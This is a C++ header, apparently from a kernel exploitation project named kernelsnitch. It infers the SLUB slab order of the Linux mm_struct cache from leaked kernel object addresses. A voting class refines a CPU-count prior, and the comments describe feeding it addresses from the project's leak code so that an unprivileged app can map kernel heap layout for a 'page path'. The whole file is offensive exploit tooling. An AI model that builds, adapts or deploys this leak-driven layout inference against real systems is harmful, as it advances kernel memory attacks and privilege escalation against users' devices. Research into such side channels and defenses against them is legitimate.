#ifndef KERNELSNITCH_SLAB_ORDER_H
#define KERNELSNITCH_SLAB_ORDER_H

#include <cstddef>
#include <cstdint>

#include "kernel/constants.hpp"

/*
 * The mm_struct slab order, derived at runtime (five-four-support-plan 2.6.4).
 *
 * SLUB's calculate_order() sizes the cache from
 * `min_objects = 4 * (fls(nr_cpu_ids) + 1)` and the object stride, so the same
 * Image yields a different order at a different possible-CPU count (measured:
 * 960 -> order 1 / 8 objects at 1 vCPU, order 3 / 34 objects at 8). The order
 * is not an image fact, the app cannot read /proc/slabinfo, and the slub
 * cmdline parameters are root-only, so the rule is a prior only.
 *
 * The vote corrects it from the page path's own leak. A leaked mm_struct
 * object sits at slab_base + i * stride; for a candidate slab size
 * S = PAGE_SIZE << order, the offset `leaked & (S-1)` is a multiple of the
 * stride and fits inside S only when the true slab shares the candidate's
 * alignment block. The true order passes every leak; a false order passes a
 * leak with probability min(S, S_true) / max(S, S_true), the shared sub-block
 * fraction. The prior is kept while it has never failed; after a failure the
 * nearest surviving order takes over. A false order survives k leaks with
 * probability ratio^k, so a wrong prior converges to the true order.
 *
 * Only the page path uses this; the page-free routes never prepare a page.
 */
namespace ghostlock::kernelsnitch {
    /* The stride window (800..1400) needs at least 8 objects, so the mm_struct
     * slab can never be order 0; slub_max_order defaults to 3 and the
     * calculate_order fallback ends there too. */
    inline constexpr std::uint32_t SLAB_ORDER_MIN = 1;
    inline constexpr std::uint32_t SLAB_ORDER_MAX = 3;

    constexpr std::uint32_t slab_fls(std::uint32_t value) {
        std::uint32_t bits = 0;
        while (value != 0) {
            ++bits;
            value >>= 1;
        }
        return bits;
    }

    /* The smallest order whose slab holds `bytes` (the kernel's get_order),
     * capped at slub_max_order. KS_PAGE_SIZE rather than kernel::PAGE_SIZE:
     * kernelsnitch/utils.h defines a `PAGE_SIZE` macro for the leak code. */
    constexpr std::uint32_t slab_order_for_bytes(std::uint64_t bytes) {
        std::uint32_t order = 0;
        while (order < SLAB_ORDER_MAX &&
               (static_cast<std::uint64_t>(kernel::KS_PAGE_SIZE) << order) < bytes) {
            ++order;
        }
        return order;
    }

    /* SLUB's calculate_order() with the default slub_min_order=0,
     * slub_max_order=3 and slub_min_objects=0, reduced to the order the cache
     * would take. The fallback loop lowers min_objects when the wanted size
     * exceeds the max order; capping the result at SLAB_ORDER_MAX gives the
     * same final order. */
    constexpr std::uint32_t slab_order_prior(std::uint32_t stride,
                                             std::uint32_t nr_cpu_ids) {
        const std::uint32_t min_objects = 4 * (slab_fls(nr_cpu_ids) + 1);
        const std::uint64_t wanted =
                static_cast<std::uint64_t>(stride) * min_objects;
        std::uint32_t order = slab_order_for_bytes(wanted);
        if (order < SLAB_ORDER_MIN) order = SLAB_ORDER_MIN;
        return order;
    }

    constexpr std::size_t slab_bytes(std::uint32_t order) {
        return static_cast<std::size_t>(kernel::KS_PAGE_SIZE) << order;
    }

    /* A leak is an mm_struct object address; the candidate slab passes when
     * the object offset is stride-aligned and the whole object fits. */
    constexpr bool slab_candidate_passes(std::uintptr_t leaked,
                                         std::uint32_t stride,
                                         std::uint32_t order) {
        const std::uintptr_t slab =
                static_cast<std::uintptr_t>(slab_bytes(order));
        const std::uintptr_t offset = leaked & (slab - 1);
        return offset % stride == 0 && offset + stride <= slab;
    }

    class SlabOrderVote {
    public:
        /* One fresh leak per prepare round. The same address is scored against
         * every candidate; no extra leak is taken. */
        void observe(std::uintptr_t leaked, std::uint32_t stride) {
            ++observations_;
            for (std::uint32_t order = SLAB_ORDER_MIN; order <= SLAB_ORDER_MAX;
                 ++order) {
                if (slab_candidate_passes(leaked, stride, order)) {
                    ++passes_[index(order)];
                } else {
                    ++fails_[index(order)];
                }
            }
        }

        /* The prior is kept while it has never failed. A failed prior is
         * evidence against it; the nearest order with no failure takes over.
         * With no survivor (a stride that matches nothing) the prior stands. */
        [[nodiscard]] std::uint32_t choose(std::uint32_t prior) const {
            if (prior < SLAB_ORDER_MIN) prior = SLAB_ORDER_MIN;
            if (prior > SLAB_ORDER_MAX) prior = SLAB_ORDER_MAX;
            if (fails_[index(prior)] == 0) return prior;
            std::uint32_t best = prior;
            std::uint32_t best_distance = 0xffffffffU;
            for (std::uint32_t order = SLAB_ORDER_MIN; order <= SLAB_ORDER_MAX;
                 ++order) {
                if (fails_[index(order)] != 0) continue;
                const std::uint32_t distance =
                        order > prior ? order - prior : prior - order;
                if (distance < best_distance) {
                    best_distance = distance;
                    best = order;
                }
            }
            return best;
        }

        [[nodiscard]] std::uint32_t observations() const { return observations_; }

        [[nodiscard]] std::uint32_t passes(std::uint32_t order) const {
            if (order < SLAB_ORDER_MIN || order > SLAB_ORDER_MAX) return 0;
            return passes_[index(order)];
        }

        [[nodiscard]] std::uint32_t fails(std::uint32_t order) const {
            if (order < SLAB_ORDER_MIN || order > SLAB_ORDER_MAX) return 0;
            return fails_[index(order)];
        }

    private:
        static constexpr std::size_t kCandidates =
                SLAB_ORDER_MAX - SLAB_ORDER_MIN + 1;

        static constexpr std::size_t index(std::uint32_t order) {
            return static_cast<std::size_t>(order - SLAB_ORDER_MIN);
        }

        std::uint32_t observations_ = 0;
        std::uint32_t passes_[kCandidates] = {};
        std::uint32_t fails_[kCandidates] = {};
    };
} // namespace ghostlock::kernelsnitch

#endif
